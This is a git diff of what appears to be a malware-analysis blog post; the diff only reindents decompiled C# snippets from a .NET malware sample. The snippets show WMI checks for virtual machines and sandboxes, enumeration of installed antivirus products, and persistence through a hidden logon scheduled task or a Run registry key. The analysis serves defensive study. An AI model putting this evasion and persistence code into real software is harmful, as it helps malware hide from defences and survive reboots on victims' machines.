@@ -332,47 +332,47 @@ We also discover other interesting aspects to the configuration, such as simple 
 ![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/d6428bfe-c8bb-4528-8d08-d596a92a6874)
 
 ```
-			try
-			{
-				string machineName = Environment.MachineName;
-				ConnectionOptions options = new ConnectionOptions
-				{
-					EnablePrivileges = true,
-					Impersonation = ImpersonationLevel.Impersonate
-				};
-				ManagementScope scope = new ManagementScope("\\\\" + machineName + "\\root\\CIMV2", options);
-				ObjectQuery query = new ObjectQuery("SELECT * FROM Win32_OperatingSystem");
-				using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher(scope, query))
-				{
-					using (ManagementObjectCollection managementObjectCollection = managementObjectSearcher.Get())
-					{
-						if (managementObjectCollection.Count != 1)
-						{
-							throw new ManagementException();
-						}
-						bool flag;
-						switch ((uint)managementObjectCollection.OfType<ManagementObject>().First<ManagementObject>().Properties["ProductType"].Value)
+try
+{
+ string machineName = Environment.MachineName;
+ ConnectionOptions options = new ConnectionOptions
+ {
+  EnablePrivileges = true,
+  Impersonation = ImpersonationLevel.Impersonate
+ };
+ ManagementScope scope = new ManagementScope("\\\\" + machineName + "\\root\\CIMV2", options);
+ ObjectQuery query = new ObjectQuery("SELECT * FROM Win32_OperatingSystem");
+ using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher(scope, query))
+ {
+  using (ManagementObjectCollection managementObjectCollection = managementObjectSearcher.Get())
+  {
+   if (managementObjectCollection.Count != 1)
+   {
+    throw new ManagementException();
+   }
+   bool flag;
+   switch ((uint)managementObjectCollection.OfType<ManagementObject>().First<ManagementObject>().Properties["ProductType"].Value)
 ```
 
 ![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/b5c19e52-405a-4a1c-bb1a-9fd603fb50a5)
 
 ```
-			try
-			{
-				ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher(new SelectQuery("Select * from Win32_CacheMemory"));
-				int num = 0;
-				foreach (ManagementBaseObject managementBaseObject in managementObjectSearcher.Get())
-				{
-					ManagementObject managementObject = (ManagementObject)managementBaseObject;
-					num++;
-				}
-				result = (num < 2);
-			}
-			catch
-			{
-				result = true;
-			}
-			return result;
+try
+{
+ ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher(new SelectQuery("Select * from Win32_CacheMemory"));
+ int num = 0;
+ foreach (ManagementBaseObject managementBaseObject in managementObjectSearcher.Get())
+ {
+  ManagementObject managementObject = (ManagementObject)managementBaseObject;
+  num++;
+ }
+ result = (num < 2);
+}
+catch
+{
+ result = true;
+}
+return result;
 ```
 
 Querying AntiVirus products on the host:
@@ -380,25 +380,25 @@ Querying AntiVirus products on the host:
 ![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/986155b1-a05c-4ae8-8fcc-7a9bdf109730)
 
 ```
-			try
-			{
-				string text = string.Empty;
-				using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("\\\\" + Environment.MachineName + "\\root\\SecurityCenter2", "Select * from AntivirusProduct"))
-				{
-					foreach (ManagementBaseObject managementBaseObject in managementObjectSearcher.Get())
-					{
-						ManagementObject managementObject = (ManagementObject)managementBaseObject;
-						text = text + managementObject["displayName"].ToString() + "; ";
-					}
-				}
-				text = Methods.RemoveLastChars(text, 2);
-				result = ((!string.IsNullOrEmpty(text)) ? text : "N/A");
-			}
-			catch
-			{
-				result = "Unknown";
-			}
-			return result;
+try
+{
+ string text = string.Empty;
+ using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("\\\\" + Environment.MachineName + "\\root\\SecurityCenter2", "Select * from AntivirusProduct"))
+ {
+  foreach (ManagementBaseObject managementBaseObject in managementObjectSearcher.Get())
+  {
+   ManagementObject managementObject = (ManagementObject)managementBaseObject;
+   text = text + managementObject["displayName"].ToString() + "; ";
+  }
+ }
+ text = Methods.RemoveLastChars(text, 2);
+ result = ((!string.IsNullOrEmpty(text)) ? text : "N/A");
+}
+catch
+{
+ result = "Unknown";
+}
+return result;
 ```
 
 And installing persistence methods through scheduled tasks and run keys:
@@ -407,29 +407,29 @@ And installing persistence methods through scheduled tasks and run keys:
 
 ```
 if (Methods.IsAdmin())
-					{
-						Process.Start(new ProcessStartInfo
-						{
-							FileName = "cmd",
-							Arguments = string.Concat(new string[]
-							{
-								"/c schtasks /create /f /sc onlogon /rl highest /tn \"",
-								Path.GetFileNameWithoutExtension(fileInfo.Name),
-								"\" /tr '\"",
-								fileInfo.FullName,
-								"\"' & exit"
-							}),
-							WindowStyle = ProcessWindowStyle.Hidden,
-							CreateNoWindow = true
-						});
-					}
-					else
-					{
-						using (RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\", RegistryKeyPermissionCheck.ReadWriteSubTree))
-						{
-							registryKey.SetValue(Path.GetFileNameWithoutExtension(fileInfo.Name), "\"" + fileInfo.FullName + "\"");
-						}
-					}
+ {
+  Process.Start(new ProcessStartInfo
+  {
+   FileName = "cmd",
+   Arguments = string.Concat(new string[]
+   {
+    "/c schtasks /create /f /sc onlogon /rl highest /tn \"",
+    Path.GetFileNameWithoutExtension(fileInfo.Name),
+    "\" /tr '\"",
+    fileInfo.FullName,
+    "\"' & exit"
+   }),
+   WindowStyle = ProcessWindowStyle.Hidden,
+   CreateNoWindow = true
+  });
+ }
+ else
+ {
+  using (RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\", RegistryKeyPermissionCheck.ReadWriteSubTree))
+  {
+   registryKey.SetValue(Path.GetFileNameWithoutExtension(fileInfo.Name), "\"" + fileInfo.FullName + "\"");
+  }
+ }
 ```
 
 
